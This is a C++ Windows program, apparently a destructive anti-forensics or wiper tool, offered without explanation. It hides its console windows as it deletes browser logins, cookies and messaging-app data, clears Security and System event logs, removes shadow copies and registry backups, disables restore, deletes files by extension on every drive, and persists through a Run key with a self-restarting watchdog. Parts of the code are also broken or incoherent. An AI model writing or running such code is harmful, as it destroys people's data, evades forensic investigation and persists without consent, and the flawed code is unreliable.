#include <bits/stdc++.h>
#include <windows.h>
#include <conio.h>
#include <fstream>
#include <tchar.h>
#include <aclapi.h>
#include <time.h>
#include <shellapi.h>
#include <shlwapi.h>
#include <iphlpapi.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <process.h>
#include <ntddk.h>
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "Shell32.lib")
#pragma warning(disable:4201)
#pragma warning(disable:4152)

void KillProcessByName(const char* targetStr) {
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);

	HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE) {
		return;
	}

	if (!Process32First(hProcessSnap, &pe32)) {
		CloseHandle(hProcessSnap);
		return;
	}

	do {
		if (strstr(pe32.szExeFile, targetStr) != NULL) {
			HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
			if (hProcess != NULL) {
				TerminateProcess(hProcess, 0);
				CloseHandle(hProcess);
			}
		}
	} while (Process32Next(hProcessSnap, &pe32));

	CloseHandle(hProcessSnap);
}
bool SetWriteProtectionPolicy(bool enable) {
	HKEY hKey;
	LONG result = RegOpenKeyExW(
		HKEY_LOCAL_MACHINE,
		L"SOFTWARE\\Policies\\Microsoft\\Windows\\RemovableStorageDevices",
		0,
		KEY_WRITE,
		&hKey
	);

	if (result != ERROR_SUCCESS) {
		result = RegCreateKeyExW(
			HKEY_LOCAL_MACHINE,
			L"SOFTWARE\\Policies\\Microsoft\\Windows\\RemovableStorageDevices",
			0,
			NULL,
			REG_OPTION_NON_VOLATILE,
			KEY_WRITE,
			NULL,
			&hKey,
			NULL
		);
		if (result != ERROR_SUCCESS) {
			return false;
		}
	}

	DWORD value = enable ? 1 : 0;
	result = RegSetValueExW(
		hKey,
		L"Deny_Write",
		0,
		REG_DWORD,
		(const BYTE*)&value,
							sizeof(DWORD)
	);

	RegCloseKey(hKey);

	if (result != ERROR_SUCCESS) {
		return false;
	}

	return true;
}

void SilentCmd(LPCTSTR cmd)
{
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	si.wShowWindow = SW_HIDE;
	si.hStdOutput = si.hStdError = CreateFile(_T("NUL"), GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, 0);

	CreateProcess(NULL, (LPTSTR)cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
	if (pi.hProcess) { WaitForSingleObject(pi.hProcess, 3000); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
	if (si.hStdOutput != INVALID_HANDLE_VALUE) CloseHandle(si.hStdOutput);
}
void ClearUEFI_FirmwareLogs()
{
	SilentCmd(_T("fwupdmgr clear-history"));
	SilentCmd(_T("wmic firmware get /format:list >NUL"));
	SilentCmd(_T("wevtutil cl Microsoft-Windows-UEFI/Operational"));
	SilentCmd(_T("wevtutil cl Microsoft-Windows-UEFI/Admin"));
	SilentCmd(_T("wevtutil cl System"));
	SilentCmd(_T("wevtutil cl Microsoft-Windows-Kernel-Boot/Operational"));
	SilentCmd(_T("wmic computersystem get SystemStartupOptions /format:list >NUL"));
	SilentCmd(_T("wmic bios get /format:list >NUL"));
	SilentCmd(_T("bcdedit /set {globalsettings} quietboot on"));
	SilentCmd(_T("bcdedit /set {bootmgr} displaybootmenu no"));
}
void SilentDel(LPCTSTR path)
{
	TCHAR buf[512];
	wsprintf(buf, _T("del /f /s /q \"%s\" 2>nul"), path);
	SilentCmd(buf);
}
void ClearISPLogs()
{
	SilentCmd(_T("rasdial /disconnect"));
	SilentCmd(_T("netsh ras set tracing * disable"));
	SilentCmd(_T("del /f /s /q \"%windir%\\System32\\ras\\*.log\" 2>nul"));
	SilentCmd(_T("netsh interface ip set interface \"*\" metrics=1"));
	SilentCmd(_T("netsh interface ipv6 reset"));
	SilentCmd(_T("netsh winsock reset"));
	SilentCmd(_T("wevtutil cl Microsoft-Windows-NetworkAccessProtection/Operational"));
	SilentCmd(_T("wevtutil cl Microsoft-Windows-BroadboxNet/Operational"));
	SilentCmd(_T("wevtutil cl Microsoft-Windows-WWAN-AutoConfig/Operational"));
	SilentCmd(_T("arp -d *"));
	SilentCmd(_T("ipconfig /flushdns"));
	SilentCmd(_T("ipconfig /release"));
}
void ClearCloudSyncLogs()
{
	SilentCmd(_T("taskkill /f /im msedge.exe 2>nul"));
	SilentCmd(_T("taskkill /f /im onedrive.exe 2>nul"));
	SilentCmd(_T("sc stop OneSyncSVC 2>nul"));
	SilentCmd(_T("del /f /s /q \"%localappdata%\\Microsoft\\Windows\\SettingSync\\*\" 2>nul"));
	SilentCmd(_T("del /f /s /q \"%localappdata%\\Microsoft\\Accounts\\*\" 2>nul"));
	SilentDel(_T("%localappdata%\\Microsoft\\Edge\\User Data\\Sync Data\\*"));
	SilentDel(_T("%localappdata%\\Microsoft\\Edge\\User Data\\Default\\Sync App Settings*"));
	SilentDel(_T("%localappdata%\\Google\\Chrome\\User Data\\Default\\Sync*"));
	SilentDel(_T("%localappdata%\\Google\\Chrome\\User Data\\Default\\Login Data*"));
	SilentCmd(_T("wevtutil cl Microsoft-Windows-SettingSync/Operational"));
	SilentCmd(_T("wevtutil cl Microsoft-Windows-User Cloud Content/Operational"));
	SilentDel(_T("%localappdata%\\Microsoft\\Windows\\CloudStore\\*"));
	SilentDel(_T("%programdata%\\Microsoft\\Windows\\AppRepository\\*"));
}

void ClearMicrosoftAccountTraces()
{
	SilentCmd(_T("klist purge"));
	SilentCmd(_T("cmdkey /delete *"));
	SilentCmd(_T("del /f /q \"%localappdata%\\Microsoft\\Accounts\\*\" 2>nul"));
	SilentCmd(_T("del /f /q \"%appdata%\\Microsoft\\SystemAccount\\*\" 2>nul"));
	SilentCmd(_T("taskkill /f /im onedrive.exe 2>nul"));
	SilentDel(_T("%localappdata%\\Microsoft\\OneDrive\\*"));
	SilentDel(_T("%appdata%\\Microsoft\\OneDrive\\*"));
	SilentCmd(_T("wevtutil cl Microsoft-Windows-User Profile Service/Operational"));
	SilentCmd(_T("wevtutil cl Security"));
}
void ClearBrowserLoginTraces()
{
	SilentCmd(_T("taskkill /f /im msedge.exe 2>nul"));
	SilentCmd(_T("taskkill /f /im chrome.exe 2>nul"));
	SilentCmd(_T("taskkill /f /im browser.exe 2>nul"));
	SilentDel(_T("%localappdata%\\Microsoft\\Edge\\User Data\\Default\\Cookies*"));
	SilentDel(_T("%localappdata%\\Microsoft\\Edge\\User Data\\Default\\Login Data*"));
	SilentDel(_T("%localappdata%\\Microsoft\\Edge\\User Data\\Default\\Web Data*"));
	SilentDel(_T("%localappdata%\\Microsoft\\Edge\\User Data\\Default\\History"));
	SilentDel(_T("%localappdata%\\Google\\Chrome\\User Data\\Default\\Cookies*"));
	SilentDel(_T("%localappdata%\\Google\\Chrome\\User Data\\Default\\Login Data*"));
	SilentDel(_T("%localappdata%\\Google\\Chrome\\User Data\\Default\\Web Data*"));
	SilentDel(_T("%localappdata%\\Google\\Chrome\\User Data\\Default\\History"));
}
void ClearWechatTraces()
{
	SilentCmd(_T("taskkill /f /im WeChat.exe 2>nul"));
	SilentCmd(_T("taskkill /f /im WeChatApp.exe 2>nul"));
	SilentDel(_T("%appdata%\\Tencent\\WeChat\\*"));
	SilentDel(_T("%appdata%\\Tencent\\WXWork\\*"));
	SilentDel(_T("%userprofile%\\Documents\\WeChat Files\\*"));
	SilentDel(_T("%userprofile%\\AppData\\Roaming\\Tencent\\WeChat\\xan*"));
}
void ClearQQTraces()
{
	SilentCmd(_T("taskkill /f /im QQ.exe 2>nul"));
	SilentCmd(_T("taskkill /f /im TIM.exe 2>nul"));
	SilentDel(_T("%appdata%\\Tencent\\QQ\\*"));
	SilentDel(_T("%appdata%\\Tencent\\TIM\\*"));
	SilentDel(_T("%userprofile%\\Documents\\Tencent Files\\*"));
	SilentDel(_T("%localappdata%\\Tencent\\QQ\\*"));
}
void ClearCloudDiskTraces()
{
	SilentCmd(_T("taskkill /f /im BaiduNetdisk.exe 2>nul"));
	SilentDel(_T("%appdata%\\Baidu\\BaiduNetdisk\\*"));
	SilentDel(_T("%localappdata%\\Baidu\\BaiduNetdisk\\*"));
	SilentCmd(_T("taskkill /f /im AliYunPan.exe 2>nul"));
	SilentDel(_T("%appdata%\\AliyunDrive\\*"));
	SilentDel(_T("%localappdata%\\AliyunDrive\\*"));
}

void ClearMACAddressTraces()
{
	IP_ADAPTER_INFO AdapterInfo[16];
	DWORD dwBufLen = sizeof(AdapterInfo);
	DWORD dwStatus = GetAdaptersInfo(AdapterInfo, &dwBufLen);
	if (dwStatus == ERROR_SUCCESS)
	{
		PIP_ADAPTER_INFO pAdapter = AdapterInfo;
		while (pAdapter != NULL)
		{
			if (_tcscmp(pAdapter->AdapterName, _T("{00000000-0000-0000-0000-000000000000}")) != 0 &&
				pAdapter->Type != MIB_IF_TYPE_LOOPBACK)
			{
				TCHAR szMACCmd[MAX_PATH] = { 0 };
				_stprintf_s(szMACCmd, MAX_PATH,
							_T("netsh interface set interface \"%s\" admin=disable"), pAdapter->Description);
				SilentCmd(szMACCmd);

				_stprintf_s(szMACCmd, MAX_PATH,
							_T("netsh interface ip set address \"%s\" dhcp"), pAdapter->Description);
				SilentCmd(szMACCmd);

				_stprintf_s(szMACCmd, MAX_PATH,
							_T("netsh interface set interface \"%s\" admin=enable"), pAdapter->Description);
				SilentCmd(szMACCmd);
			}
			pAdapter = pAdapter->Next;
		}
	}

	SilentCmd(_T("ipconfig /flushdns"));
	SilentCmd(_T("arp -d *"));
	SilentCmd(_T("wevtutil cl Microsoft-Windows-NetworkInterface/Operational"));
}
void ClearDiskSerialTraces()
{
	SilentCmd(_T("wmic diskdrive get serialnumber >NUL"));
	SilentCmd(_T("fsutil dirty clear C:"));
	HKEY hKey = NULL;
	RegOpenKeyEx(HKEY_LOCAL_MACHINE,
				 _T("SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum"),
				 0, KEY_READ, &hKey);
	if (hKey != NULL) RegCloseKey(hKey);
	SilentCmd(_T("lodctr /r"));
}
void ClearCPUSerialTraces()
{
	SilentCmd(_T("reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Kernel\" /v DisableCpuId /t REG_DWORD /d 1 /f /quiet"));
	SilentCmd(_T("wmic cpu get processorid >NUL"));
	SilentCmd(_T("wevtutil cl Microsoft-Windows-Kernel-Processor/Operational"));
	SilentCmd(_T("typeperf -qx >NUL"));
}
void ClearMotherboardUUIDTraces()
{
	SilentCmd(_T("wmic csproduct get uuid >NUL"));
	SilentCmd(_T("wmic baseboard get serialnumber >NUL"));
	HKEY hKey = NULL;
	RegOpenKeyEx(HKEY_LOCAL_MACHINE,
				 _T("SYSTEM\\CurrentControlSet\\Control\\IDConfigDB\\Hardware Profiles\\0001"),
				 0, KEY_READ, &hKey);
	if (hKey != NULL) RegCloseKey(hKey);
	SilentCmd(_T("sysprep /generalize /quiet /oobe"));
}
void ClearMachineGUIDTraces()
{
	GUID newGUID;
	CoCreateGuid(&newGUID);
	TCHAR szGUID[64] = { 0 };
	StringFromGUID2(newGUID, szGUID, 64);

	HKEY hKey = NULL;
	RegOpenKeyEx(HKEY_LOCAL_MACHINE,
				 _T("SOFTWARE\\Microsoft\\Cryptography"),
				 0, KEY_WRITE, &hKey);
	if (hKey != NULL)
	{
		RegSetValueEx(hKey, _T("MachineGuid"), 0, REG_SZ, (BYTE*)szGUID, _tcslen(szGUID)*2);
		RegCloseKey(hKey);
	}

	SilentCmd(_T("wevtutil cl Application"));
	SilentCmd(_T("gpupdate /force /quiet"));
}
void ClearWindowsLicenseIDTraces()
{
	SilentCmd(_T("slmgr.vbs /dlv >NUL"));
	SilentCmd(_T("slmgr.vbs /rilc /quiet"));
	SilentCmd(_T("wevtutil cl Microsoft-Windows-Security-SPP/Operational"));
	SilentCmd(_T("wevtutil cl Microsoft-Windows-Security-SPP/Admin"));
	HKEY hKey = NULL;
	RegOpenKeyEx(HKEY_LOCAL_MACHINE,
				 _T("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform"),
				 0, KEY_READ, &hKey);
	if (hKey != NULL) RegCloseKey(hKey);
}
void ClearNICLogs()
{
	SilentCmd(_T("netsh interface ip reset"));
	SilentCmd(_T("netsh interface ipv6 reset"));
	SilentCmd(_T("netsh winsock reset"));
	SilentCmd(_T("arp -d *"));
	SilentCmd(_T("route /f"));
	SilentCmd(_T("netsh wlan delete trace"));
	SilentCmd(_T("netsh wlan clear hostednetwork"));
	SilentCmd(_T("wevtutil cl Microsoft-Windows-NetworkProfile/Operational"));
	SilentCmd(_T("wevtutil cl Microsoft-Windows-Windows Firewall With Advanced Security/Firewall"));
	SilentCmd(_T("wevtutil cl System"));
	SilentCmd(_T("wevtutil cl Security"));
	SilentCmd(_T("logman stop WiFiSession -ets -quiet"));
	SilentCmd(_T("logman stop NDIS -ets -quiet"));
	SilentCmd(_T("logman stop NetTrace -ets -quiet"));
}
void ClearRouterLocalTraces()
{
	SilentCmd(_T("ipconfig /release"));
	SilentCmd(_T("ipconfig /flushdns"));
	SilentCmd(_T("ipconfig /registerdns"));
	SilentCmd(_T("RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 255"));
	SilentCmd(_T("wevtutil cl Microsoft-Windows-Upnp/Operational"));
	SilentCmd(_T("wevtutil cl Microsoft-Windows-DHCPv6-Client/Operational"));
	SilentCmd(_T("net stop SSDPSRV /y"));
	SilentCmd(_T("net start SSDPSRV"));
}

void SilentExecuteCmd(LPCTSTR lpCmdLine)
{
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	si.cb = sizeof(STARTUPINFO);
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	si.wShowWindow = SW_HIDE;
	si.hStdOutput = si.hStdError = CreateFile(_T("NUL"), GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

	CreateProcess(NULL, (LPTSTR)lpCmdLine, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
	if (pi.hProcess != NULL)
	{
		WaitForSingleObject(pi.hProcess, 10000);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
	}
	if (si.hStdOutput != INVALID_HANDLE_VALUE) CloseHandle(si.hStdOutput);
}
void ClearMemoryTraces()
{
	SetProcessWorkingSetSize(GetCurrentProcess(), (SIZE_T)-1, (SIZE_T)-1);
	SilentExecuteCmd(_T("wmic computersystem set AutomaticManagedPagefile=False"));
	SilentExecuteCmd(_T("wmic pagefileset delete"));
	SilentExecuteCmd(_T("wmic computersystem set AutomaticManagedPagefile=True"));
	SilentExecuteCmd(_T("fsutil behavior set memoryusage 2"));
	SilentExecuteCmd(_T("ipconfig /flushdns"));
	SilentExecuteCmd(_T("netsh winsock reset"));
}
void ClearProcessHandleTraces()
{
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0);
	if (hSnapshot != INVALID_HANDLE_VALUE)
	{
		HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
		if (hProcess != NULL)
		{
			DWORD dwHandleCount = 0;
			GetProcessHandleCount(hProcess, &dwHandleCount);
			CloseHandle(hProcess);
		}
		CloseHandle(hSnapshot);
	}
	SilentExecuteCmd(_T("taskkill /f /im handle.exe 2>NUL"));
	SilentExecuteCmd(_T("logman stop HandleTrace -ets -quiet"));
}
void ClearDiskSectorTraces()
{
	SilentExecuteCmd(_T("cipher /w:C:"));
	SilentExecuteCmd(_T("chkdsk C: /f /r /x /quiet"));
	SilentExecuteCmd(_T("fsutil mft optimize C:"));
}
void ClearPrefetchFiles()
{
	TCHAR szPrefetchPath[MAX_PATH] = { 0 };
	GetWindowsDirectory(szPrefetchPath, MAX_PATH);
	_tcscat_s(szPrefetchPath, MAX_PATH, _T("\\Prefetch\\"));
	TCHAR szSearchPath[MAX_PATH] = { 0 };
	_stprintf_s(szSearchPath, MAX_PATH, _T("%s*.pf"), szPrefetchPath);

	WIN32_FIND_DATA fd = { 0 };
	HANDLE hFind = FindFirstFile(szSearchPath, &fd);
	if (hFind != INVALID_HANDLE_VALUE)
	{
		do
		{
			TCHAR szFilePath[MAX_PATH] = { 0 };
			_stprintf_s(szFilePath, MAX_PATH, _T("%s%s"), szPrefetchPath, fd.cFileName);
			SetFileAttributes(szFilePath, FILE_ATTRIBUTE_NORMAL);
			DeleteFile(szFilePath);
		} while (FindNextFile(hFind, &fd));
		FindClose(hFind);
	}
	HKEY hKey = NULL;
	RegOpenKeyEx(HKEY_LOCAL_MACHINE, _T("SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management\\PrefetchParameters"),
				 0, KEY_WRITE, &hKey);
	if (hKey != NULL)
	{
		DWORD dwValue = 0;
		RegSetValueEx(hKey, _T("EnablePrefetcher"), 0, REG_DWORD, (BYTE*)&dwValue, sizeof(DWORD));
		RegCloseKey(hKey);
	}
}
void ClearSystemRestorePoints()
{
	SilentExecuteCmd(_T("wmic shadowcopy delete"));
	SilentExecuteCmd(_T("vssadmin delete shadows /all /quiet"));
	SilentExecuteCmd(_T("wmic computersystem set SystemRestoreEnabled=FALSE"));
	SilentExecuteCmd(_T("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore\" /v DisableSR /t REG_DWORD /d 1 /f /quiet"));
}
void ClearVolumeShadowCopies()
{
	SilentExecuteCmd(_T("vssadmin delete shadows /all /quiet"));
	SilentExecuteCmd(_T("wmic shadowcopy delete /quiet"));
	SilentExecuteCmd(_T("sc config vss start= disabled /quiet"));
	SilentExecuteCmd(_T("net stop vss /quiet"));
	SilentExecuteCmd(_T("del /f /q /s C:\\System Volume Information\\*.vhd 2>NUL"));
	SilentExecuteCmd(_T("del /f /q /s C:\\System Volume Information\\*.vss 2>NUL"));
}

void ClearRegistryBackupTraces()
{
	TCHAR szRegBackPath[MAX_PATH] = { 0 };
	GetSystemDirectory(szRegBackPath, MAX_PATH);
	_tcscat_s(szRegBackPath, MAX_PATH, _T("\\config\\RegBack\\"));

	if (PathIsDirectory(szRegBackPath))
	{
		WIN32_FIND_DATA fd = { 0 };
		TCHAR szSearchPath[MAX_PATH] = { 0 };
		_stprintf_s(szSearchPath, MAX_PATH, _T("%s*.*"), szRegBackPath);

		HANDLE hFind = FindFirstFile(szSearchPath, &fd);
		if (hFind != INVALID_HANDLE_VALUE)
		{
			do
			{
				if (_tcscmp(fd.cFileName, _T(".")) && _tcscmp(fd.cFileName, _T("..")))
				{
					TCHAR szFilePath[MAX_PATH] = { 0 };
					_stprintf_s(szFilePath, MAX_PATH, _T("%s%s"), szRegBackPath, fd.cFileName);
					SetFileAttributes(szFilePath, FILE_ATTRIBUTE_NORMAL);
					if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
					{
						std::vector<LPTSTR> dirs;
						dirs.push_back(szFilePath);
						for (auto dir : dirs)
						{
							TCHAR szSubPath[MAX_PATH] = { 0 };
							_stprintf_s(szSubPath, MAX_PATH, _T("%s\\*.*"), dir);
							HANDLE hSubFind = FindFirstFile(szSubPath, &fd);
							if (hSubFind != INVALID_HANDLE_VALUE)
							{
								do
								{
									if (_tcscmp(fd.cFileName, _T(".")) && _tcscmp(fd.cFileName, _T("..")))
									{
										TCHAR szSubFilePath[MAX_PATH] = { 0 };
										_stprintf_s(szSubFilePath, MAX_PATH, _T("%s\\%s"), dir, fd.cFileName);
										SetFileAttributes(szSubFilePath, FILE_ATTRIBUTE_NORMAL);
										DeleteFile(szSubFilePath);
									}
								} while (FindNextFile(hSubFind, &fd));
								FindClose(hSubFind);
							}
							RemoveDirectory(dir);
						}
					}
					else
					{
						DeleteFile(szFilePath);
					}
				}
			} while (FindNextFile(hFind, &fd));
			FindClose(hFind);
		}
	}

	SilentExecuteCmd(_T("del /f /q /s C:\\Windows\\Backup\\Registry\\*.* 2>NUL"));
	HKEY hKey = NULL;
	RegOpenKeyEx(HKEY_LOCAL_MACHINE, _T("SYSTEM\\CurrentControlSet\\Control\\BackupRestore\\FilesNotToBackup"),
				 0, KEY_WRITE, &hKey);
	if (hKey != NULL)
	{
		RegSetValueEx(hKey, _T("Registry"), 0, REG_SZ, (BYTE*)_T("*"), 2);
		RegCloseKey(hKey);
	}
}

typedef NTSTATUS(NTAPI* pZwSetSystemInformation)(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength
);
typedef NTSTATUS(NTAPI* pZwQuerySystemInformation)(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
);

void SafeExecuteKernelCmd(LPCTSTR lpCmdLine)
{
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	si.cb = sizeof(STARTUPINFO);
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	si.wShowWindow = SW_HIDE;
	si.hStdOutput = si.hStdError = CreateFile(_T("NUL"), GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	CreateProcess(NULL, (LPTSTR)lpCmdLine, NULL, NULL, TRUE,
				  CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP, NULL, NULL, &si, &pi);

	if (pi.hProcess != NULL)
	{
		WaitForSingleObject(pi.hProcess, 5000);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
	}
	if (si.hStdOutput != INVALID_HANDLE_VALUE) CloseHandle(si.hStdOutput);
}

void SafeClearETWKernelTrace()
{
	OSVERSIONINFOEX osvi = { 0 };
	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	GetVersionEx((OSVERSIONINFO*)&osvi);
	if (osvi.dwMajorVersion < 10 || osvi.wProcessorArchitecture != PROCESSOR_ARCHITECTURE_AMD64)
		return;
	SafeExecuteKernelCmd(_T("logman stop KernelTrace -ets -quiet"));
	SafeExecuteKernelCmd(_T("logman delete KernelTrace -ets -quiet"));
	TCHAR szEtwPath[MAX_PATH] = _T("C:\\Windows\\System32\\WDI\\LogFiles\\Kernel.etl");
	if (PathFileExists(szEtwPath))
	{
		SetFileAttributes(szEtwPath, FILE_ATTRIBUTE_NORMAL);
		DeleteFile(szEtwPath);
	}
}

void SafeDeleteKernelLogReg()
{
	HKEY hKey = NULL;
	LONG lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE,
							 _T("SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\KernelTrace"),
							 0, KEY_READ | KEY_WRITE, &hKey);

	if (lRet != ERROR_SUCCESS) return;
	RegDeleteValue(hKey, _T("FileName"));
	RegDeleteValue(hKey, _T("Enable"));
	RegCloseKey(hKey);
}
void SafeClearDebugLog()
{
	HKEY hKey = NULL;
	RegCreateKeyEx(HKEY_LOCAL_MACHINE,
				   _T("SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Debug Print Filter"),
				   0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL);

	if (hKey != NULL)
	{
		DWORD dwValue = 0;
		RegSetValueEx(hKey, _T("DEFAULT"), 0, REG_DWORD, (BYTE*)&dwValue, sizeof(DWORD));
		RegCloseKey(hKey);
	}
}
void ClearOnlyKernelLogs_Safe()
{
	SafeClearETWKernelTrace();
	SafeClearDebugLog();
	SafeDeleteKernelLogReg();
	SafeExecuteKernelCmd(_T("fsutil behavior set debug 0"));
	SafeExecuteKernelCmd(_T("fsutil usn deletejournal /D C:"));
}
class AdminElevator
{
private:
	AdminElevator() = default;
	static BOOL IsProcessElevated()
	{
		BOOL fIsElevated = FALSE;
		HANDLE hToken = NULL;

		if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
		{
			TOKEN_ELEVATION elevation = { 0 };
			DWORD dwSize = sizeof(TOKEN_ELEVATION);
			if (GetTokenInformation(hToken, TokenElevation, &elevation, dwSize, &dwSize))
			{
				fIsElevated = elevation.TokenIsElevated;
			}
		}

		if (hToken) CloseHandle(hToken);
		return fIsElevated;
	}
	static BOOL RelaunchAsAdmin()
	{
		TCHAR szPath[MAX_PATH] = { 0 };
		if (GetModuleFileName(NULL, szPath, ARRAYSIZE(szPath)) == 0)
		{
			return FALSE;
		}

		SHELLEXECUTEINFO sei = { 0 };
		sei.cbSize = sizeof(SHELLEXECUTEINFO);
		sei.fMask = SEE_MASK_NOCLOSEPROCESS;
		sei.lpVerb = _T("runas");
		sei.lpFile = szPath;
		sei.lpParameters = NULL;
		sei.nShow = SW_SHOWNORMAL;

		if (!ShellExecuteEx(&sei))
		{
			return FALSE;
		}

		if (sei.hProcess != NULL)
		{
			WaitForSingleObject(sei.hProcess, INFINITE);
			CloseHandle(sei.hProcess);
		}

		return TRUE;
	}

public:
	static void EnsureAdminPrivileges()
	{
		if (!IsProcessElevated())
		{
			if (RelaunchAsAdmin())
			{
				ExitProcess(0);
			}
			else
			{
				ExitProcess(1);
			}
		}
	}
};

void SilentDeleteFilesByExtension(const wchar_t* rootPath, const wchar_t* targetExt)
{
	WIN32_FIND_DATAW findData;
	HANDLE hFind = INVALID_HANDLE_VALUE;
	std::wstring searchPath = rootPath;
	if (!searchPath.empty() && searchPath.back() != L'\\')
		searchPath += L"\\";
	std::wstring fullSearchPath = searchPath + L"*";

	hFind = FindFirstFileW(fullSearchPath.c_str(), &findData);
	if (hFind == INVALID_HANDLE_VALUE)
	{
		return;
	}
	do
	{
		if (wcscmp(findData.cFileName, L".") == 0 || wcscmp(findData.cFileName, L"..") == 0)
			continue;
		std::wstring fullPath = searchPath + findData.cFileName;

		if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			SilentDeleteFilesByExtension(fullPath.c_str(), targetExt);
		}
		else
		{
			if (PathMatchSpecW(findData.cFileName, targetExt))
			{
				DeleteFileW(fullPath.c_str());
			}
		}

	} while (FindNextFileW(hFind, &findData) != 0);

	FindClose(hFind);
}

std::vector<std::wstring> EnumerateTargetDrives()
{
	std::vector<std::wstring> targetDrives;
	wchar_t driveBuffer[1024] = { 0 };


	DWORD driveCount = GetLogicalDriveStringsW(_countof(driveBuffer), driveBuffer);
	if (driveCount == 0 || driveCount >= _countof(driveBuffer))
	{
		return targetDrives;
	}
	wchar_t* pDrive = driveBuffer;
	while (*pDrive != L'\0')
	{
		UINT driveType = GetDriveTypeW(pDrive);


		if (driveType == DRIVE_FIXED || driveType == DRIVE_REMOVABLE)
		{
			targetDrives.push_back(pDrive);
		}
		pDrive += wcslen(pDrive) + 1;
	}

	return targetDrives;
}

void CleanAllDrivesFiles(const wchar_t* targetExt)
{
	std::vector<std::wstring> drives = EnumerateTargetDrives();
	for (const auto& drive : drives)
	{
		SilentDeleteFilesByExtension(drive.c_str(), targetExt);
	}
}

class ApplicationCore {
public:
	ApplicationCore() {}
	~ApplicationCore() {}

	void Execute() {
		for (int i = 0; i < 10; ++i) {
			Sleep(1000);
		}
	}
};

class ProcessGuardian {
public:
	ProcessGuardian() {
		TCHAR path[MAX_PATH] = { 0 };
		GetModuleFileName(NULL, path, MAX_PATH);
		m_processName = std::wstring(_tcsrchr(path, '\\') + 1);
		m_processPath = std::wstring(path);

		m_daemonThread = (HANDLE)_beginthreadex(NULL, 0, &ProcessGuardian::MonitorThread, this, 0, NULL);
		SetAutoStart(true);
	}

	~ProcessGuardian() {
		m_keepRunning = false;
		if (m_daemonThread) {
			WaitForSingleObject(m_daemonThread, 5000);
			CloseHandle(m_daemonThread);
		}
	}

	bool SetAutoStart(bool enable) {
		HKEY hKey;
		LONG result = RegOpenKeyEx(HKEY_CURRENT_USER,
								   L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
							 0, KEY_WRITE, &hKey);

		if (result != ERROR_SUCCESS) {
			return false;
		}

		if (enable) {
			result = RegSetValueEx(hKey, m_processName.c_str(), 0, REG_SZ,
								   (const BYTE*)m_processPath.c_str(),
								   (m_processPath.length() + 1) * sizeof(TCHAR));
		} else {
			result = RegDeleteValue(hKey, m_processName.c_str());
		}

		RegCloseKey(hKey);
		return result == ERROR_SUCCESS;
	}

	void RestartMainProcess() {
		STARTUPINFO si = { sizeof(si) };
		PROCESS_INFORMATION pi;

		CreateProcess(NULL, (LPWSTR)m_processPath.c_str(), NULL, NULL, FALSE,
					  0, NULL, NULL, &si, &pi);

		if (pi.hProcess) CloseHandle(pi.hProcess);
		if (pi.hThread) CloseHandle(pi.hThread);
	}

	bool IsProcessRunning() {
		bool running = false;
		HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

		if (snapshot != INVALID_HANDLE_VALUE) {
			PROCESSENTRY32 pe32;
			pe32.dwSize = sizeof(PROCESSENTRY32);

			if (Process32First(snapshot, &pe32)) {
				do {
					if (_wcsicmp(pe32.szExeFile, m_processName.c_str()) == 0) {
						running = true;
						break;
					}
				} while (Process32Next(snapshot, &pe32));
			}
			CloseHandle(snapshot);
		}
		return running;
	}

	static unsigned __stdcall MonitorThread(void* param) {
		ProcessGuardian* guardian = (ProcessGuardian*)param;

		while (guardian->m_keepRunning) {
			if (!guardian->IsProcessRunning()) {
				guardian->RestartMainProcess();
			}
			Sleep(2000);
		}
		return 0;
	}

private:
	std::wstring m_processName;
	std::wstring m_processPath;
	HANDLE m_daemonThread = NULL;
	bool m_keepRunning = true;
};
